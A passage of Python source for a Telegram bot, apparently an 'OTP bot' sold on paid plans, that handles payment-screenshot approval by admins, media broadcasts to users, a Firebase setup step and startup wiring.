            "plan_price":       plan["price"],
            "screenshot_file_id": photo.file_id,
            "timestamp":        now_str(),
            "status":           "pending",
        }
        save_data(data)

        h = plan["hours"]
        if h >= 720:   dur = f"{int(h//720)} Month ({int(h)}h)"
        elif h >= 168: dur = f"{int(h//168)} Week ({int(h)}h)"
        elif h >= 24:  dur = f"{int(h//24)} Din ({int(h)}h)"
        else:          dur = f"{h}h"

        await update.message.reply_text(
            f"✅ <b>Screenshot Mila!</b>\n\n"
            f"📦 Plan   : <b>{dur}</b>\n"
            f"💵 Amount : ₹{plan['price']}\n\n"
            f"Admin approve karega toh access <b>automatically add</b> ho jaayega!\n"
            f"⏳ <i>Thoda wait karo...</i>",
            parse_mode="HTML")

        admin_caption = (
            f"💰 <b>New Payment Request!</b>\n{'─'*28}\n\n"
            f"🆔 User ID  : <code>{uid}</code>\n"
            f"👤 Name     : <b>{nm}</b>\n"
            f"📦 Plan     : <b>{dur}</b>\n"
            f"💵 Amount   : <b>₹{plan['price']}</b>\n"
            f"🕐 Time     : <code>{now_str()}</code>\n\n"
            f"<b>Payment ID: <code>{pay_id}</code></b>"
        )
        admin_kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Approve", callback_data=f"pay_ok:{pay_id}"),
            InlineKeyboardButton("❌ Reject",  callback_data=f"pay_no:{pay_id}"),
        ]])
        for admin_id in ADMIN_IDS:
            try:
                await ctx.bot.send_photo(
                    admin_id, photo=photo.file_id,
                    caption=admin_caption, parse_mode="HTML",
                    reply_markup=admin_kb)
            except Exception as e:
                logger.warning(f"Could not notify admin {admin_id}: {e}")
        return

# ─── Broadcast helpers ─────────────────────────────────────────────────────────
async def _do_broadcast_media(ctx, ud, update, send_fn):
    ud.pop("awaiting_broadcast")
    sent = failed = 0
    for uid_s in data["users"]:
        try:
            await send_fn(int(uid_s))
            sent += 1
        except:
            failed += 1
    await update.message.reply_text(
        f"📢 <b>Broadcast Done!</b>\n✅ Sent: {sent}\n❌ Failed: {failed}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("👑 Admin Panel", callback_data="admin")
        ]]))

async def video_broadcast_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ud  = ctx.user_data
    if not is_admin(uid) or not ud.get("awaiting_broadcast"):
        return
    vid     = update.message.video
    caption = update.message.caption or ""
    await _do_broadcast_media(ctx, ud, update,
        lambda chat_id: ctx.bot.send_video(chat_id, video=vid.file_id,
                                           caption=caption, parse_mode="HTML"))

async def doc_broadcast_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ud  = ctx.user_data
    if not is_admin(uid) or not ud.get("awaiting_broadcast"):
        return
    doc     = update.message.document
    caption = update.message.caption or ""
    await _do_broadcast_media(ctx, ud, update,
        lambda chat_id: ctx.bot.send_document(chat_id, document=doc.file_id,
                                              caption=caption, parse_mode="HTML"))

async def sticker_broadcast_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ud  = ctx.user_data
    if not is_admin(uid) or not ud.get("awaiting_broadcast"):
        return
    sticker = update.message.sticker
    await _do_broadcast_media(ctx, ud, update,
        lambda chat_id: ctx.bot.send_sticker(chat_id, sticker=sticker.file_id))

# ─── Background job ───────────────────────────────────────────────────────────
async def cmd_skip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ud  = ctx.user_data
    if ud.get("fb_step") == "api_key" and is_admin(uid):
        ud["fb_api_key"] = ""
        ud["fb_step"]    = "label"
        await update.message.reply_text(
            "✅ <b>API Key Skip!</b> (Public DB — key nahi chahiye)\n\n"
            "🔥 <b>Add Firebase — Step 3/3</b>\n\n"
            "📝 <b>Ab iska naam/label do:</b>\n"
            "<i>Example: Main DB, Client 2, Backup</i>",
            parse_mode="HTML")
    else:
        await update.message.reply_text(
            "ℹ️ <code>/skip</code> sirf Firebase key step mein kaam karta hai.",
            parse_mode="HTML")

async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    err_msg = str(ctx.error)
    if "Message is not modified" in err_msg:
        return
    if "Query is too old" in err_msg or "MESSAGE_ID_INVALID" in err_msg:
        return
    logger.error(f"Exception while handling update: {ctx.error}", exc_info=ctx.error)

async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
    await refresh_all()

# ─── Main ─────────────────────────────────────────────────────────────────────
async def _on_startup(app):
    """Load latest data from Firestore before bot starts polling."""
    await _sync_from_firebase_on_startup()
    logger.info(f"🔥 Firebase DBs: {[c['label'] for c in data['firebase_configs']]}")
    logger.info(f"👥 Total users loaded: {len(data['users'])}")

def main():
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!"); return
    logger.info("🚀 ZONEX X OTP Bot v4.6 starting...")
    logger.info(f"👑 Admins: {ADMIN_IDS}")
    logger.info(f"📢 Channels: {CHANNELS}")
    logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
    logger.info(f"🔑 API Key: {GAPI_KEY[:15]}..." if GAPI_KEY else "❌ API Key NOT SET!")

    app = Application.builder().token(BOT_TOKEN).post_init(_on_startup).concurrent_updates(True).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", cmd_start)],
        states={
            WAIT_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key_entry)],
        },
        fallbacks=[CommandHandler("start", cmd_start)],
        per_message=False,
    )
    app.add_handler(conv)
    app.add_handler(CommandHandler("skip", cmd_skip))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    app.add_handler(MessageHandler(filters.VIDEO, video_broadcast_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, doc_broadcast_handler))
    app.add_handler(MessageHandler(filters.Sticker.ALL, sticker_broadcast_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_error_handler(error_handler)
    app.job_queue.run_repeating(auto_fetch, interval=AUTO_REFRESH, first=3, name="auto_fetch")

    logger.info("✅ Bot running! Send /start on Telegram.")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()
